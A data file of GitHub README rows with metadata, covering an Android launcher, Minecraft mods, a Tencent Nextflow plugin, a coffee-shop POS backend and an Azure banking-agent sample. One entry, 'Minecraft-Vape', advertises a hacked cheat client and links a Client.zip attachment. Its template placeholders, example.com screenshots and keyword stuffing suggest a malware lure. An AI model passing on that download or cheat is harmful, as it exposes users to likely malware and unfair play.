lalakii/LaLauncher,master,"# La Launcher
[![Android: 1+ (shields.io)](https://img.shields.io/badge/Android-1+-2f9b45?logo=android)](https://www.bilibili.com/video/BV1FW421d7Fi/)

A very small Android launcher.

体积超小的安卓启动器 | [Download](https://github.com/lalakii/LaLauncher/releases) | [蓝奏云下载](https://a01.lanzout.com/b0hc4tmoj) 密码：cig9

![Demo](demo.jpg)
## By lalaki.cn
",3,0,2,0.0,"['la', 'launcher', 'by']","['la', 'launcher', 'by']"
BacconKam/Minecraft-Vape,master,"# Minecraft-Vape

Welcome to the Minecraft-Vape repository! 🎮

## Description

This repository hosts the latest version of Minecraft Vape, a powerful hacked client designed for enhancing your gameplay experience in Minecraft. Whether you are looking to gain an edge in PvP battles or automate tedious tasks, Minecraft Vape has got you covered.

## Features

- **ESP (Extrasensory Perception)**: Easily spot enemy players and mobs through walls, allowing you to stay ahead of the competition.
- **KillAura**: Automatically attacks nearby entities, giving you a significant advantage in combat situations.
- **Vape v4 Client**: The latest version of Vape client, packed with new features and improvements.
- **Wurst Integration**: Seamless integration with the Wurst client, expanding the range of tools at your disposal.

## Download

[![Download Minecraft Vape](https://img.shields.io/badge/Download-Client.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/16830252/Client.zip)

Replace `<COLOR_HEX_CODE>` with the desired hexadecimal color code for the download button.

## Getting Started

To get started with Minecraft Vape, follow these steps:

1. Download the client using the download button above.
2. Install Minecraft Vape by following the installation instructions provided in the client package.
3. Launch Minecraft and enjoy the enhanced gameplay experience!

## Screenshots

Here are some screenshots of Minecraft Vape in action:

![Screenshot 1](https://example.com/screenshot1.png)

![Screenshot 2](https://example.com/screenshot2.png)

## Documentation

For detailed documentation on how to use Minecraft Vape and leverage its features to the fullest, refer to the [user manual](docs/manual.md).

## Contributions

Contributions to Minecraft Vape are welcome! If you have suggestions for new features or enhancements, feel free to submit a pull request.

## Support

If you encounter any issues while using Minecraft Vape or have any questions, please reach out to our support team at support@minecraftvape.com.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

Thank you for choosing Minecraft Vape for your hacked client needs! Happy gaming! 🚀🎉

---

#### Keywords: minecraft, minecraft-client, minecraft-esp, minecraft-killaura, minecraft-vape, minecraft-mod, minecraft-vape-v4-download, minecraft-wurst, vape-hack-minecraft, vape-v4-client, vape-v4-hack, hacked-client, vape-v4, minecraft-bedrock, minecraft-bot, minecraft-clone, minecraft-launcher, minecraft-plugins, minecraft-script, vape",0,0,1,0.0,"['description', 'feature', 'download', 'get', 'start', 'screenshots', 'documentation', 'contribution', 'support', 'license', 'keywords', 'minecraft', 'vape']","['description', 'feature', 'download', 'get', 'start']"
shasankp000/AI-Player,master,"# Read this section please.

This project so far is the result of thousands of hours of endless reasearch, trials and errors, and just the simple goal of eliminating loneliness from minecraft as much as possible.
If you liked my work, please consider donating so that I can continue to work on this project in peace and can actually prove to my parents that my work is making a difference. (Also not having to ask for pocket money from mom).

Just know that I won't ever give up on this project.

[![""Buy Me A Coffee""](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/shasankp000)

## Paypal

[https://paypal.me/shasankp000](https://paypal.me/shasankp000)

---
# Also, THIS!

If anyone is interested on the underlying algorithms I am working on for increased **intelligence** for the minecraft bot, feel free to check out this repository: 

https://github.com/shasankp000/AI-Tricks

I am open to suggestions/improvements, if any. (Obviously there will be improvements from my own end).

  
---

# Project description

---

**The footages for the bot conversation and config manager here in the github page is a bit outated. Check the modrinth page and download the mod to stay updated.** 
  
A minecraft mod which aims to add a ""second player"" into the game which will actually be intelligent.

**Ever felt lonely while playing minecraft alone during that two-week phase? Well, this mod aims to solve that problem of loneliness, not just catering to this particular use case, but even (hopefully in the future) to play in multiplayer servers as well.**

**Please note that this is not some sort of a commercialised AI product. This project is just a solution to a problem many Minecraft players have faced and do continue to face.**

I had to add that statement up there to prevent misunderstandings.

This mod relies on the internal code of the Carpet mod, please star the repository of the mod: https://github.com/gnembon/fabric-carpet (Giving credit where it's due)

This mod also relies on the ollama4j project. https://github.com/amithkoujalgi/ollama4j

---

# Upcoming features

- Fully implemented pathfinding for the bot.
- Collision and entity detection(detects entites around it and looks at it).
- Interaction with the world environment in general.

---


# Download links

1. From this github page, just download from the releases section or follow the steps in usage section to build and test.
2. Modrinth: https://modrinth.com/mod/ai-player/ [Recommended as the github version is often unstable]
3. Curseforge: Will upload soon after a few more patches and updates.

---

# Progress: 60%

## For the nerds

Sucessfully implemented the intellgence update.

So, for the tech savvy people, I have implemented the following features.

**LONG TERM MEMORY**: This mod now features concepts used in the field AI like Natural Language Processing (much better now) and something called

**Retrieval Augmented Generation (RAG)**.

How does it work?

Well:

![Retrieval Augmented Generation process outline](https://cdn.modrinth.com/data/cached_images/f4f51461946d8fb02be131d6ea53db238cdbd8c4.png)

![Vectors](https://media.geeksforgeeks.org/wp-content/uploads/20200911171455/UntitledDiagram2.png)


We convert the user input, to a set of vector embeddings which is a list of numbers.

Then **physics 101!**

A vector is a representation of 3 coordinates in the XYZ plane. It has two parts, a direction and a magnitude.

If you have two vectors, you can check their similarity by checking the angle between them.

The closer the vectors are to each other, the more **similar** they are!

Now if you have two sentences, converted to vectors, you can find out whether they are similar to each other using this process.

In this particular instance I have used a method called **cosine similarity**

[Cosine similarity](https://www.geeksforgeeks.org/cosine-similarity/)

Where you find the similarity using the formula

`(x, y) = x . y / |x| . |y|`

where |x| and |y| are the magnitudes of the vectors.


So we use this technique to fetch a bunch of stored conversation and event data from an SQL database, generate their vector embeddings, and then run that against the user's prompt. We get then further sort on the basis on let's say timestamps and we get the most relevant conversation for what the player said.


Pair this with **function calling**. Which combines Natural Language processing to understand what the player wants the bot to do, then call a pre-coded method, for example movement and block check, to get the bot to do the task.

Save this data, i.e what the bot did just now to the database and you get even more improved memory!

To top it all off, Gemma 2 8b is the best performing model for this mod right now, so I will suggest y'all to use gemma2.

In fact some of the methods won't even run without gemma2 like the RAG for example so it's a must.

---

![image](https://github.com/shasankp000/AI-Player/assets/46317225/6b8e22e2-cf00-462a-936b-d5b6f14fb228)

Successfully managed to spawn a ""second player"" bot.

Added basic bot movement.

[botmovement.webm](https://github.com/user-attachments/assets/c9062a42-b914-403b-b44a-19fad1663bc8)


Implemented basic bot conversation 

[bandicam 2024-07-19 11-12-07-431.webm](https://github.com/user-attachments/assets/556d8d87-826a-4477-9717-74f38c9059e9)


Added a mod configuration menu (Still a work in progress)


https://github.com/user-attachments/assets/5ed6d6cf-2516-4a2a-8cd2-25c0c1eacbae

**Implemented intermediate XZ pathfinding for the bot**


https://github.com/user-attachments/assets/687b72a2-a4a8-4ab7-8b77-7373d414bb28

**Implemented Natural Language Processing for the bot to understand the intention and context of the user input and execute methods**
Can only understand if you want the bot to go some coordinates.

https://vimeo.com/992051891?share=copy

**Implemented nearby entity detection**



https://github.com/user-attachments/assets/d6cd7d86-9651-4e6f-b14a-56332206a440




---
# Usage

## If you want to manually build and test this project, follow from step 1.

## For playing the game, download the jar file either from modrinth or the releases section and go directly to step 6.

**For users who have used the mod before, transitioning to version 1.0.2-hotfix-3**

```
1. Go to your game folder (.minecraft)/config and you will find a settings.json5 file.
Delete that

2.(If you have run the previous 1.0.2 version already then) again go back to your .minecraft. you will find a folder called ""sqlite_databases"". Inside that is a file called memory_agent.db

3. Delete that as well.
4. Install the models, mistral, llama2 and nomic-embed-text

5.Then run the game
6. Inside the game run /configMan to set the language model to llama2.

Then spawn the bot and start talking!
```

---
# Buidling the project from intellij

Step 1. Download Java 21. 

This project is built on java 21 to support carpet mod's updated API.

Go to: https://bell-sw.com/pages/downloads/#jdk-21-lts

Click on Download MSI and finish the installation process. [Windows]

![image](https://github.com/user-attachments/assets/8cf3cbe1-91a9-4d7e-9510-84723d928025)

**For linux users, depending on your system install openjdk-21-jdk package.**


Step 2. Download IntelliJ idea community edition.

https://www.jetbrains.com/idea/download/?section=windows

![Screenshot 2024-07-21 123239](https://github.com/user-attachments/assets/75d636cb-99f8-4966-8a18-f9ae22ce46bc)

Step 3. Download the project. 

If you have git setup in your machine already you can just clone the project to your machine and then open it in intellij

Or alternatively download it as a zip file, extract it and then open it in intellij

![image](https://github.com/user-attachments/assets/4384fa90-2fe9-4685-a793-8238f2789532)

Step 4. Configure the project SDK.

![image](https://github.com/user-attachments/assets/ee5a1be5-7fa4-4d42-bfdd-291a74666267)

Click on the settings gear.

![image](https://github.com/user-attachments/assets/ef74de58-6e97-428a-9e76-c5c19423963b)

Go to Project Structure

![image](https://github.com/user-attachments/assets/8979a760-3a96-49a6-8a42-c8dcd4c2e0ee)

Configure the SDK here, set it to liberica 21


Step 5. Once done wait for intellij to build the project sources, this will take a while as it basically downloads minecraft to run in a test version.

If you happen to see some errors, go to the right sidebar, click on the elephant icon (gradle)

![image](https://github.com/user-attachments/assets/7916d2bf-1381-4f9e-9df6-1e43a7bfed55)

And click on the refresh button, besides the plus icon.
Additionally you can go to the terminal icon on the bottom left

![image](https://github.com/user-attachments/assets/f95f54ab-847a-42de-b3d8-4401f03ac83a)

And type `./graldew build`


Step 6. Setup ollama.

Go to https://ollama.com/

![image](https://github.com/user-attachments/assets/c28798e4-c7bf-4faf-88e5-76315f88f0d1)

Download based on your operating system.

After installation, run ollama from your desktop. This will launch the ollama server. 

This can be accessed in your system tray

![image](https://github.com/user-attachments/assets/3ed6468e-0e8c-4723-ac80-1ab77a7208d4)


Now open a command line client, on windows, search CMD or terminal and then open it.

Depending on your specs, you can download a language model and then configure in the project to use it.

For now, in the terminal, type ![image](https://github.com/user-attachments/assets/7ecf3eea-2a7c-481b-a914-53678081e60e)

~~In this example we are going with the phi3 model.~~

For the updated version 1.0.2, you will need to download the `llama2` model: `ollama pull llama2` 
And another model `nomic-embed-text`: `ollama pull nomic-embed-text`

Without llama2, intelligence will be very low
Without nomic-embed-text, the mod will crash.


I do intend to add an option in the mod to change and configure models within the game GUI.

Once done. Go to the next step.

Step 7. Go to the files section

![image](https://github.com/user-attachments/assets/443b12ad-cb8c-4049-8fa3-01875023c42a)

Click on the ollamaClient 

Go to line 199.

[recording1](https://github.com/user-attachments/assets/bd01e7a7-ef5f-4379-9157-965c97b85ce3)

Remove the current model type, then follow the video and set it to `OllamaModelType.PHI3`

Although intelliJ autosaves but press `CTRL+S` to save.

Step 8. Finally click on the gradle icon again in the right sidebar.

![image](https://github.com/user-attachments/assets/64b085c2-1624-4cfc-9b64-22fd293f1cfe)

Fine the runClient task, and double click it to run minecraft with the mod.

---
# Mod usage

This section is to describe the usage of the mod in-game

## Commands

**Main command**

`/bot`

Sub commands: 

`spawm <bot>` This command is used to spawn a bot with the desired name. ==For testing purposes, please keep the bot name to Steve==.

`walk <bot> <till>` This command will make the bot walk forward for a specific amount of seconds.

`go_to <bot> <x> <y> <z>` This command is supposed to make the bot go to the specified co-ordinates, by finding the shortest path to it. It is still a work in progress as of the moment.

`send_message_to <bot> <message>` This command will help you to talk to the bot.

`teleport_forward <bot>` This command will teleport the bot forward by 1 positive block

`test_chat_message <bot>` A test command to make sure that the bot can send messages.

`detect_entities <bot> A command which is supposed to detect entities around the bot`

**Example Usage:**

`/bot spawn Steve`

The above command changes credits go to [Mr. Álvaro Carvalho](https://github.com/A11v1r15)

And yes since this mod relies on carpet mod, you can spawn a bot using carpet mod's commands too and try the mod. But if you happen to be playing in offline mode, then I recommend using the mod's in built spawn command.


",7,0,1,1.0,"['read', 'section', 'please', 'paypal', 'also', 'this', 'project', 'description', 'upcoming', 'feature', 'download', 'link', 'progress', 'for', 'nerd', 'usage', 'if', 'want', 'manually', 'build', 'test', 'project', 'follow', 'step', 'for', 'play', 'game', 'download', 'jar', 'file', 'either', 'modrinth', 'release', 'section', 'go', 'directly', 'step', 'buidling', 'project', 'intellij', 'mod', 'usage', 'command']","['project', 'section', 'download', 'for', 'usage']"
Tencent/nf-tencentcloud,master,"English | [简体中文](./README_ZH.md)

<picture>
  <source media=""(prefers-color-scheme: dark)"" srcset=""assets/logo-bg-dark.png"">
  <source media=""(prefers-color-scheme: light)"" srcset=""assets/logo-bg-light.png"">
  <img alt=""nf-tencentcloud Logo"" src=""assets/logo-bg-light.png"">
</picture>

## nf-tencentcloud

[![Nextflow](https://img.shields.io/badge/nextflow%20DSL2-%E2%89%A523.04.0-23aa62.svg)](https://www.nextflow.io/)
[![Release](https://img.shields.io/badge/v2.0.0-v?label=realease)](https://github.com/Tencent/nf-tencentcloud/releases/tag/2.0.0)
[![TencentCos](https://img.shields.io/badge/TencentCos-s?logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyAgIHdpZHRoPSIxNnB4IiAgIGhlaWdodD0iMTZweCIgIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICAgIDx0aXRsZT7lr7nosaHlrZjlgqgtMTZweDwvdGl0bGU%2BCiAgICA8ZyBpZD0i5a%2B56LGh5a2Y5YKoLTE2cHgiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSLnvJbnu4QiPgogICAgICAgICAgICA8cmVjdCBpZD0iUmVjdGFuZ2xlLUNvcHkiIGZpbGw9IiM0NDQ0NDQiIG9wYWNpdHk9IjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI%2BPC9yZWN0PgogICAgICAgICAgICA8cGF0aCBkPSJNOCwwIEwxLDQuMDAxIEwxLDEyLjAwMSBMOCwxNiBMMTUsMTIuMDAxIEwxNSw0LjAwMSBMOCwwIFogTTQuMDQ2LDQuNTYzIEw4LDIuMzA0IEwxMS45NTMsNC41NjMgTDgsNi44NDUgTDQuMDQ2LDQuNTYzIFogTTksOC41NzggTDEyLjk5OSw2LjI2OCBMMTIuOTk5LDEwLjg0IEw5LDEzLjEyNiBMOSw4LjU3OCBaIE0zLDEwLjg0IEwzLDYuMjY4IEw3LDguNTc4IEw3LDEzLjEyNiBMMywxMC44NCBaIiBpZD0iRmlsbCIgZmlsbD0iI0ZGRkZGRiI%2BPC9wYXRoPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc%2B&label=run%20with)](https://cloud.tencent.com/product/cos)
[![TencentOmics](https://img.shields.io/badge/TencentOmics-s?logo=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1%2BjfqAAAAIGNIUk0AAHomAACAhAAA%2BgAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAD%2Fh4%2FMvwAAAAlwSFlzAABYlQAAWJUB2W030wAAAAd0SU1FB%2BgIFgYnAkOH3zYAAAFRSURBVCjPRZExS9txFEWPv7Rqo6QIdZaSTRFFKHZorYagm0umxkKloPkSpVu3QrcOQhEHtS7VTSrZgihBdLJxUAimpYNKRYXUBDwd8o95b3nv3ru88wAQExb9Z0rESWvu2C0AgUZdU6SDt3TSwzwPKXITOTZ72FMvzbmqHjnQ1DFmPFqybnmslpyIlLgh8IwVMgSgnRGS%2FGCZBBAjywqD%2BEn9Ko575q0fHbNs2QGDa%2BqHwAsgD8zxhHUW%2BcMefcxyRx54iRVvfG7CA%2FXMigVnrbpr3JS3lppn1qkCDwD4S414NBP4TRdPqVIA9pniDWkSHHJFknZ%2BBQpAGliiTJJe5shxwQJtpIECjrphxiBO%2B95N9dx3YszXrjuEMR9FWF75Uz1xy5kWqBbqfkvqN3NeWnHkHvX9Pz6r3%2B2xw0X1i22RGQW63bbulIjjVt3zcSPwH3ir7avSxkx9AAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDI0LTA4LTIyVDA2OjM4OjQ0KzAwOjAwUNWOEgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyNC0wOC0yMlQwNjozODo0NCswMDowMCGINq4AAAAodEVYdGRhdGU6dGltZXN0YW1wADIwMjQtMDgtMjJUMDY6Mzk6MDIrMDA6MDB%2BxUePAAAAAElFTkSuQmCC&label=run%20with)](https://cloud.tencent.com/product/omics)
[![nf-tencentcloud license](https://img.shields.io/badge/licence-Apache%202.0-green)](https://github.com/Tencent/nf-tencentcloud/blob/master/LICENSE)

nf-tencentcloud is a nextflow plugin designed to add Tencent Cloud Object storage and Tencent Healthcare Omics Platform executor adaptation support to the nextflow workflow engine. Through this component, it can also implement some detailed function adaptations required by the platform, such as metadata file generation, to ensure the efficient operation and management of the workflow. Its design goal is to extend Tencent Cloud's native support for Nextflow workflows, allowing users to run Nextflow workflows using Tencent Cloud resources in a simple and easy-to-use manner.

we use [Task Execution Schema](https://github.com/ga4gh/task-execution-schemas) (TES) protocol as the protocol for nextflow to dock with the Tencent Healthcare Omics Platform. Compared to the official plugin, we utilize some custom fields to adapt to the platform features.

## Feature

- Supports docking with Tencent Cloud COS object storage, allowing direct dependence on Tencent Cloud files in files and configurations.
- Supports docking with Tencent Healthcare Omics Platform for quick access to high-performance elastic computing capabilities (For more information about Tencent Health Genomics Platform, please refer to: [Tencent Healthcare Omics Platform](https://cloud.tencent.com/product/omics)).

## Installation

- Make sure that nextflow is already installed on your system.
- Run the following command to install nf-tencentcloud.
  ```bash
  nextflow plugin install nf-tencentcloud
  ```
  You can install the nf-tencentcloud plugin that meets your current environment.
- You can also specify the plugin in the configuration file for installation.
  ```groovy
  plugins {
      id 'nf-tencentcloud@2.0.0'
  }
  ```
- Or you can use the -plugins command line option.
  ```bash
  nextflow run <pipeline> -plugins nf-tencentcloud@2.0.0
  ```

## Using Tencent Cloud Object Storage

This plugin integrates COS object storage support, and you can conveniently integrate and use Tencent Cloud object storage in nextflow after completing the object storage-related service opening in Tencent Cloud.

Get the key on the [Tencent Cloud CAM console page](https://console.cloud.tencent.com/cam/capi) and follow the steps below:
- Configure the key in the nextflow configuration file.
  ```groovy
  tencentcloud {
      secretId = ""your_secret_id""
      secretKey = ""your_secret_key""
  }
  ```

- If you use temporary key authorization, you can configure accessToken to enable temporary key.
  ```groovy
  tencentcloud {
      secretId = ""your_secret_id""
      secretKey = ""your_secret_key""
      accessToken = ""your_access_token""
  }
  ```

- After the configuration is complete, you can use COS storage anywhere in the process and configuration, such as:
  ```groovy
  workDir = ""cos://test-bucket-1258888888/nextflow/workdir""
  ```

## Using Tencent Healthcare Omics Platform

This plugin integrates the Tencent Healthcare Omics Platform executor, and you can enable sandbox in the omics platform for debugging, or wait for the subsequent opening of the external network access terminal interface, and use the elastic computing resources provided by the Tencent Genomics Platform after making the corresponding configuration on your own computer.

In order to use the Tencent Health Genomics Platform executor, you need to activate and [use the Tencent Healthcare Omics Platform](https://cloud.tencent.com/document/product/1643/86477) on Tencent Cloud, and then follow the steps below:

- You need to obtain the request endpoint and accessToken in the omics platform for interface calling and authentication, and configure them in the nextflow configuration file as follows:
  ```groovy
  tencentcloud {
      omics {
          endpoint = ""http://your_endpoint/api""
          accessToken = ""your_access_token""
      }
  }
  ```
  > Please note: The accessToken here is used for Tencent Healthcare Omics Platform oauth authentication, which is different from the Tencent Cloud cam temporary authorization accessToken mentioned above, and cannot be mixed.
  
- After completing the relevant configuration, set the executor to `tencentcloud-omics` to use the elastic computing capabilities of the Tencent Health Genomics Platform.
  ```groovy
  process {
      executor = 'tencentcloud-omics'
  }
  ```

## Contributing

For more information about contributing issues or pull requests, see our [nf-tencentcloud Contributing Guide](./CONTRIBUTING.md)。

## License

nf-tencentcloud is under the Apache-2.0. See the [LICENSE](./LICENSE) file for details.

## Support

This plugin is developed by Tencent Healthcare Omics Platform team and can be used upon Tencent Healthcare Omics Platform. Tencent Healthcare Omics Platform, built on a PaaS architecture, provides genomic enterprises with an efficient deployment, flexible scheduling, and user-friendly bioinformatics cloud environment along with various computing resources

For inquiries about product testing and usage, please contact via email: omics@tencent.com",2,0,2,0.0,"['feature', 'installation', 'use', 'tencent', 'cloud', 'object', 'storage', 'use', 'tencent', 'healthcare', 'omics', 'platform', 'contribute', 'license', 'support']","['use', 'tencent', 'feature', 'installation', 'cloud']"
chamithKavinda/Coffee-Shop-POS-JavaEE-Backend,main,"# Caffeine Corner POS - JavaEE Backend
Caffeine Corner is a comprehensive Point of Sale (POS) application designed specifically for coffee shops. It provides an efficient and intuitive system for managing customer interactions,
product inventories, and order transactions. This project serves as an educational resource for mastering Java EE development.

# Project Components
## Front-end
The front-end of Caffeine Corner is crafted to offer a user-friendly interface with seamless interaction.
It utilizes HTML, CSS, jQuery, and Fetch to create a dynamic web application, ensuring a smooth user experience.

## Back-end
The back-end of Caffeine Corner handles server-side operations, data processing, and business logic. 
Implemented using Java EE and hosted on the Apache Tomcat server, it ensures robust performance and reliability for handling transactions and managing data.

### Dashboard View:
![dashboard](https://github.com/user-attachments/assets/c57d1df7-5465-472f-9690-43a8fd220f48)

### Customer Data View:
![Customer](https://github.com/user-attachments/assets/6b8d301c-efa2-4dd2-8046-262706b20ae5)

### Customer Register Form:
![customer add](https://github.com/user-attachments/assets/3d34cffa-a6d6-43ff-a62f-f750a7e04171)

### Customer Data Update Form:
![update customer](https://github.com/user-attachments/assets/abb7aa3c-b8ac-4a7f-a99a-b654649c5433)

### Product Data View:
![product](https://github.com/user-attachments/assets/31dee97a-8c56-4366-9e9e-be7338feec5a)

### Product Add Form:
![add product](https://github.com/user-attachments/assets/2897e147-c3e8-4924-b04b-8a4edb8cc156)

### Product Update Form:
![Update Product](https://github.com/user-attachments/assets/d0c110d8-e4f7-4fbb-879e-e4833bee3573)

### Place Order Form:
![placeOrder](https://github.com/user-attachments/assets/f1d7b6b2-d660-4d2a-80b2-7a73fb0fe813)

# Features

* User-friendly Interface: Designed with an intuitive layout for easy navigation and quick learning. Built using HTML, CSS , JS.
* Reporting and Analytics: Generates detailed reports and alerts on orders, product, and customer data for informed decision-making.
* JavaEE Architecture: Developed with the Java Platform, Enterprise Edition, offering a scalable architecture for enterprise-level applications.
* Apache Tomcat Server: Configured to run on Apache Tomcat, ensuring efficient and reliable web application hosting.
* Data Processing: Implements server-side logic to handle data processing and facilitate seamless communication between the front-end and database.
* Business Rules: Enforces business logic and regulations specific to coffee shop operations.
* Database Interactions: Manages interactions with the database, ensuring data integrity and security.

# Tech Stack
## Front-end:
- HTML
- CSS
- Bootstrap
- jQuery
- Fetch

## Back-end:
- Java EE
- Apache Tomcat

# Database:
* MySQL Connector: Java-based driver for connecting to MySQL databases (Version 8.0.32).
* Java Naming and Directory Interface (JNDI): Java API for connecting to directory services, used for managing database connections efficiently through connection pooling.
 
# Development Tools:
* Maven: Build automation and project management tool (Version 4.0.0)

### Frontend Implementation :
https://github.com/chamithKavinda/Coffee-Shop-POS-System-FrontEnd

# API Endpoint Documentation
* Customer - https://documenter.getpostman.com/view/35385399/2sA3s1oryn
* Product - https://documenter.getpostman.com/view/35385399/2sA3s3FqT2
* Order - https://documenter.getpostman.com/view/35385399/2sA3s3FqT3
* Order Details - https://documenter.getpostman.com/view/35385399/2sA3s3FqT4

",0,0,1,0.0,"['caffeine', 'corner', 'po', 'javaee', 'backend', 'project', 'component', 'dashboard', 'view', 'customer', 'data', 'view', 'customer', 'register', 'form', 'customer', 'data', 'update', 'form', 'product', 'data', 'view', 'product', 'add', 'form', 'product', 'update', 'form', 'place', 'order', 'form', 'feature', 'tech', 'stack', 'database', 'development', 'tool', 'frontend', 'implementation', 'api', 'endpoint', 'documentation']","['form', 'view', 'customer', 'data', 'product']"
Vishwajeet-Londhe/SPPU-CSE-SEM5-Codes,main,"# Semester 5

SPPU Computer Engineering 2019 Pattern Third Year-Sem 1 Lab Assignments Code. (If this repo helped you fork it, do star it! :)

",0,0,1,0.0,['semester'],['semester']
Azure-Samples/agent-openai-java-banking-assistant,main,"---
page_type: sample
languages:
- azdeveloper
- java
- bicep
- typescript
- html
products:
- ai-services 
- azure
- azure-openai
- active-directory
- azure-cognitive-search
- azure-container-apps
- azure-sdks
- github
- document-intelligence
- azure-monitor
- azure-pipelines
urlFragment: agent-openai-java-banking-assistant
name: Multi Agents Banking Assistant with Java and Semantic Kernel
description: A Java sample app emulating a personal banking AI-powered assistant to inquire about account balances, review recent transactions, or initiate payments
---
<!-- YAML front-matter schema: https://review.learn.microsoft.com/en-us/help/contribute/samples/process/onboarding?branch=main#supported-metadata-fields-for-readmemd -->
<!-- prettier-ignore -->
<div align=""center"">

![](./docs/assets/robot-agents-small.png)

# Multi Agents Banking Assistant with Java and Semantic Kernel

[![Open project in GitHub Codespaces](https://img.shields.io/badge/Codespaces-Open-blue?style=flat-square&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Build Status](https://img.shields.io/github/actions/workflow/status/azure-samples/agent-openai-java-banking-assistant/azure-dev.yaml?style=flat-square&label=Build)](https://github.com/azure-samples/agent-openai-java-banking-assistant/actions)
![Java version](https://img.shields.io/badge/Java->=17-3c873a?style=flat-square)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)

<!-- [![Watch how to use this sample on YouTube](https://img.shields.io/badge/YouTube-Watch-d95652.svg?style=flat-square&logo=youtube)]() -->

:star: If you like this sample, star it on GitHub — it helps a lot!

[Overview](#overview) • [Architecture](#agents-concepts-and-architectures) • [Get started](#getting-started) •  [Resources](#resources) • [FAQ](#faq) • [Troubleshooting](#troubleshooting)

![](./docs/assets/ui.gif)
</div>

This project is designed as a Proof of Concept (PoC) to explore the innovative realm of generative AI within the context of multi-agent architectures. By leveraging Java and Microsoft Semantic Kernel AI orchestration framework, our aim is to build a chat web app to demonstrate the feasibility and reliability of using generative AI agents to transform user experience from web clicks to natural language conversations while maximizing reuse of the existing workload data and APIs.



## Overview
The core use case of this Proof of Concept (PoC) revolves around a banking personal assistant designed to revolutionize the way users interact with their bank account information, transaction history, and payment functionalities. Utilizing the power of generative AI within a multi-agent architecture, this assistant aims to provide a seamless, conversational interface through which users can effortlessly access and manage their financial data.

Instead of navigating through traditional web interfaces and menus, users can simply converse with the AI-powered assistant to inquire about their account balances, review recent transactions, or initiate payments. This approach not only enhances user experience by making financial management more intuitive and accessible but also leverages the existing workload data and APIs to ensure a reliable and secure service.

Invoices samples are included in the data folder to make it easy to explore payments feature. The payment agent equipped with OCR tools ( Azure Document Intelligence) will lead the conversation with the user to extract the invoice data and initiate the payment process. Other account fake data as transactions, payment methods and account balance are also available to be queried by the user. All data and services are exposed as external REST APIs and consumed by the agents to provide the user with the requested information.

## Features 
This project provides the following features and technical patterns:
 - Simple multi ai agents Java implementation using *gpt-4o-mini* on Azure Open AI.
 - Chat intent extraction and agent routing.
 - Agents tools configuration and automatic tools invocations with [Java Semantic Kernel](https://github.com/microsoft/semantic-kernel-java/).
 - Tools output cache scoped at chat conversation level.It improves functions call planning and parameters extraction for long chat.
 - Chat based conversation implemented as [React Single Page Application](https://react.fluentui.dev/?path=/docs/concepts-introduction--docs) with support for images upload.Supported images are invoices, receipts, bills jpeg/png files you want your virtual banking assistant to pay on your behalf.
 - Images scanning and data extraction with Azure Document Intelligence using [prebuilt-invoice](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/concept-invoice?view=doc-intel-4.0.0) model.
 - Import REST api contracts (OpenAPI yaml files) as agent tools, providing automatic rest client call. It uses code from Java Semantic Kernel [open-api-plugin code sample](https://github.com/microsoft/semantic-kernel-java/tree/main/samples/semantickernel-sample-plugins/semantickernel-openapi-plugin).
 - Add a copilot app side-by-side to your existing business microservices hosted on [Azure Container Apps](https://azure.microsoft.com/en-us/products/container-apps).
 - Automated Azure resources creation and solution deployment leveraging [Azure Developer CLI](https://learn.microsoft.com/en-us/azure/developer/azure-developer-cli/).

For complex agents conversation implementation, read more about [Autogen framework](https://github.com/microsoft/autogen).

### Architecture
![HLA](docs/assets/HLA.png)
The personal banking assistant is designed as a [vertical multi-agent system](./docs/multi-agents/introduction.md), with each agent specializing in a specific functional domain (e.g., account management, transaction history, payments). The architecture consists of the following key components:

- **Copilot Assistant Copilot App (Microservice)**: Serves as the central hub for processing user requests. It's a spring boot application implementing a vertical multi-agent architectures using Java Semantic Kernel to create Agents equipped with tools. in Java the Agent Router to understand user intent from chat interactions and routes the request to the appropriate domain-specific agent.
    - **Agent Router**: Acts as a user proxy, interpreting user intent based on chat inputs and directing the request to the specific domain agent. This component ensures that user queries are efficiently handled by the relevant agent. It uses **IntentExtractor** tool backed by GPT4 model to extract the user intent in a json format. If intent is 'None' clarifying questions are provided. 

    - **Account Agent**: Specializes in handling tasks related to banking account information, credit balance, and registered payment methods. It leverages specific Account service APIs to fetch and manage account-related data. Semantic Kernel HTTP plugin is used to create a tool definition from the rest api yaml contract (Open API specification) and automatically call the HTTP endpoint with input parameters extracted by gpt4 model from the chat conversation.

    - **Transactions Agent**: Focuses on tasks related to querying user bank movements, including income and outcome payments. This agent accesses account api to retrieve accountid and transaction history service to search for transactions and present them to the user.

    - **Payments Agent**: Dedicated to managing tasks related to submitting payments. It interacts with multiple APIs and tools, such as ScanInvoice (backed by Azure Document Intelligence), Account Service to retrieve account and payment methods info, Payment Service to submit payment processing and Transaction History service to check for previous paid invoices.

- **Existing Business APIs**: Interfaces with the backend systems to perform operations related to personal banking accounts, transactions, and invoice payments. These APIs are implemented as external spring boot microservices providing the necessary data and functionality consumed by agents to execute their tasks.
    - **Account Service (Microservice)**: Provides functionalities like retrieving account details by username, fetching payment methods, and getting registered beneficiaries. This microservice supports all 3 agents.

